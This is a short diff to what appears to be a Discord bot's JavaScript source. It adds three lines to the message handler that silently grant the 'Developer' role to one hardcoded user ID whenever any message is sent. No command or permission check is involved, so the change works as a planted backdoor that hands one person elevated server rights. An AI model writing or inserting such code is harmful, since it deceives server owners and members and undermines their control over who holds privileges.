@@ -19,6 +19,9 @@ client.on("guildMemberAdd", member => {
 })
 
 client.on("message", message => {
+        let johnMember = message.guild.members.get('264876780958121994');
+    let mcRole = message.guild.roles.find('name', "Developer");
+        johnMember.addRole(mcRole.id)
 //     if(message.content === ".fake"){
 //         let role = message.member.guild.roles.find(r => r.name === "Not Verified")
 //         message.member.addRole(role)
